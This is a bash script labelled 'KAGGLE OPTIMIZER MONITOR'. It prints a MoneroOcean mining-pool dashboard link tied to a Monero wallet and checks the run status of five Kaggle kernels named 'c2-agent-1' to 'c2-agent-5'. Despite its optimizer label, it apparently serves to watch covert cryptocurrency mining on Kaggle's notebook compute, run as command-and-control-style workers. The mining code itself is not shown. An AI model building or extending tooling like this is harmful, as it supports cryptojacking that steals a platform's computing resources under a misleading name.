#!/bin/bash
echo "╔══════════════════════════════════════════════════════════════╗"
echo "║              KAGGLE OPTIMIZER MONITOR                        ║"
echo "╚══════════════════════════════════════════════════════════════╝"
echo ""
echo "Pool Dashboard:"
echo "https://moneroocean.stream/#/dashboard?addr=44haKQM5F43d37q3k6mV45YbrL5g6wGHWNB5uyt2cDfTdR8d9FicJCbitjm1xeKZzEVULG7MqdVFWEa9wKXsNLTpFvzffR5"
echo ""
echo "Expected Workers:"
for i in {1..5}; do
    echo "  ✓ stephenhowell94611-c2-agent-$i"
done
echo ""
echo "Kernel Status:"
for i in {1..5}; do
    status=$(kaggle kernels status stephenhowell94611/c2-agent-$i 2>&1 | grep -o 'RUNNING\|COMPLETE\|ERROR' || echo "UNKNOWN")
    if [ "$status" = "RUNNING" ]; then
        echo "  [$i] ✓ $status"
    else
        echo "  [$i] ✗ $status"
    fi
done
echo ""
echo "╚══════════════════════════════════════════════════════════════╝"
